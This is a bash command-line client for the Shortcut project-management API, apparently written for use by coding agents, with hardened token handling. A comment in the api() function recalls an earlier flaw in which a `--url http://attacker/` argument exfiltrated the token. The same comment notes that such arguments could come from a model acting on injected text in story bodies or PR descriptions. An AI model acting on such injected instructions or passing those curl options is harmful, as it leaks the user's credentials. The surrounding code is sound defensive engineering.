#!/usr/bin/env bash
# sc -- Shortcut CLI for coding agents.
#
# Replaces the @shortcut/mcp MCP server, which costs ~45 tool definitions
# (roughly 11k-29k tokens) in every request whether or not Shortcut is used.
# This CLI costs only what its skill's SKILL.md costs (~250 tokens), and the
# agent already knows how to run a command and pipe it to jq.
#
# The token is read from the sops store at call time, so it is never written
# into a config file on disk.
set -euo pipefail

API="https://api.app.shortcut.com/api/v3"

die() { echo "sc: $*" >&2; exit 1; }

# Locate the sops store. SC_SECRETS wins; otherwise try the usual checkouts.
# Not hardcoded to one path because this config supports any user/hostname,
# and the repo is often worked on from a git worktree.
secrets_file() {
  local c
  for c in "${SC_SECRETS:-}" \
           "$HOME/src/workspace/programs/sops/secrets.yaml" \
           "$HOME/workspace/programs/sops/secrets.yaml"; do
    [ -n "$c" ] && [ -f "$c" ] && { printf '%s' "$c"; return; }
  done
  return 1
}

# Resolved once per process: decrypting costs ~0.3s and some subcommands
# make more than one API call.
TOKEN=""
token() {
  [ -n "$TOKEN" ] && { printf '%s' "$TOKEN"; return; }
  if [ -n "${SHORTCUT_API_TOKEN:-}" ]; then
    TOKEN="$SHORTCUT_API_TOKEN"; printf '%s' "$TOKEN"; return
  fi
  local f
  f=$(secrets_file) || die "no sops secrets file found and SHORTCUT_API_TOKEN unset (set SC_SECRETS to point at one)"
  TOKEN=$(SOPS_AGE_KEY_FILE="$HOME/.config/sops/age/keys.txt" \
    sops --decrypt --output-type json "$f" 2>/dev/null \
    | jq -er '.shortcut_api_token' 2>/dev/null) \
    || die "could not read shortcut_api_token from $f"
  printf '%s' "$TOKEN"
}

# api <METHOD> <PATH> [JSON-BODY]
#
# Deliberately does NOT forward arbitrary arguments to curl. It used to take
# "$@", which let a caller pass curl options -- and since the credential is
# attached unconditionally, `--url http://attacker/` exfiltrated the token to
# any host, `-X PUT` silently turned a read into a write, and `--output`
# wrote arbitrary files. `sc raw` is documented to agents as a general escape
# hatch, so those arguments can come from a model acting on untrusted text
# (a story body, a PR description). Method and path are validated; the only
# free-form input is a request body.
api() {
  local method="$1" path="$2" reqbody="${3-}" tok; shift 2
  # Resolve the token in this shell, not inside the curl argument: a $(...)
  # substitution runs in a subshell, so a `die` there would not stop the
  # request and curl would be sent an empty token.
  tok=$(token) || exit 1
  [ -n "$tok" ] || die "empty shortcut token"
  # A newline or quote in the token would end the curl --config line and let
  # the rest be read as further directives (a second `url = ...` redirects the
  # request, and the header goes with it). The value comes from our own sops
  # store rather than untrusted input, so this is a guard against corruption
  # rather than an attack -- but it is a one-line guard.
  case $tok in
    *[$'\n\r"\\']*) die "token contains a quote, backslash or newline; refusing to use it" ;;
  esac
  # The token goes to curl over stdin via --config, never on the command
  # line: anything in argv is world-readable through `ps` for the lifetime
  # of the request, so -H "Shortcut-Token: $tok" would leak it to every
  # other process on the machine.
  case "$method" in
    GET|POST|PUT|DELETE) ;;
    *) die "unsupported method: $method" ;;
  esac
  case "$path" in
    /*) ;;
    *) die "path must start with /: $path" ;;
  esac
  case $path in
    *[$' \t\n\r']*) die "path contains whitespace: $path" ;;
  esac

  local body status
  local -a args=( -sS --config - -X "$method"
                  -H "Content-Type: application/json"
                  -w '\n%{http_code}' )
  [ -n "$reqbody" ] && args+=( -d "$reqbody" )
  # -w appends the status so a non-2xx can be turned into a non-zero exit.
  # Without this curl returns 0 on 404/401/500 and the caller sees an error
  # JSON body as if it were data -- which an agent will happily treat as a
  # real answer.
  # `--` stops option parsing so the URL can never be read as a flag.
  body=$(printf 'header = "Shortcut-Token: %s"\n' "$tok" \
    | curl "${args[@]}" -- "$API$path") || die "request failed: $method $path"
  status=${body##*$'\n'}
  body=${body%$'\n'*}
  case "$status" in
    2*) printf '%s\n' "$body" ;;
    *)  printf '%s\n' "$body" >&2; die "HTTP $status on $method $path" ;;
  esac
}

usage() {
  cat <<'USAGE'
sc -- Shortcut CLI

  sc me                        current member (name, id, mention)
  sc story <id>                fetch one story
  sc search <query>            search stories (Shortcut query syntax)
  sc mine                      stories owned by you, not yet done
  sc comment <id> <text>       add a comment to a story
  sc start <id>                move story to its workflow "started" state
  sc state <id>                workflow state of a story, resolved to a name
  sc raw <METHOD> <PATH> [json-body]  any API v3 call

Output is JSON; pipe to jq. Examples:
  sc story 12345 | jq '{name, url: .app_url}'
  sc search 'owner:mohib.mirza state:"In Progress"' | jq '.data[].name'
USAGE
}

cmd="${1:-help}"; shift || true
case "$cmd" in
  me)      api GET /member ;;
  story)   [ $# -ge 1 ] || die "usage: sc story <id>"; api GET "/stories/$1" ;;
  search)  [ $# -ge 1 ] || die "usage: sc search <query>"
           api GET "/search/stories?query=$(jq -rn --arg q "$1" '$q|@uri')" ;;
  mine)    MENTION=$(api GET /member | jq -r '.mention_name')
           api GET "/search/stories?query=$(jq -rn --arg q "owner:$MENTION !is:done" '$q|@uri')" ;;
  comment) [ $# -ge 2 ] || die "usage: sc comment <id> <text>"
           # Guard the text, not the serialized JSON: {"text":""} is non-empty,
           # so without this an empty argument posts a blank comment.
           [ -n "$2" ] || die "comment text is empty"
           api POST "/stories/$1/comments" "$(jq -n --arg t "$2" '{text:$t}')" ;;
  start)   [ $# -ge 1 ] || die "usage: sc start <id>"
           WF=$(api GET /workflows | jq -r '.[0].states[] | select(.type=="started") | .id' | head -1)
           [ -n "$WF" ] || die "could not find a started workflow state"
           api PUT "/stories/$1" "$(jq -n --argjson s "$WF" '{workflow_state_id:$s}')" ;;
  state)   [ $# -ge 1 ] || die "usage: sc state <id>"
           # A story only carries workflow_state_id, an integer. Resolve it to
           # a name so callers do not have to fetch /workflows themselves.
           SID=$(api GET "/stories/$1" | jq -r '.workflow_state_id')
           api GET /workflows \
             | jq -r --argjson s "$SID" \
                 '.[].states[] | select(.id==$s) | "\(.id)\t\(.name)\t\(.type)"' ;;
  raw)     [ $# -ge 2 ] || die "usage: sc raw <METHOD> <PATH> [json-body]"
           api "$1" "$2" "${3-}" ;;
  help|--help|-h) usage ;;
  *)       die "unknown command: $cmd (try: sc help)" ;;
esac
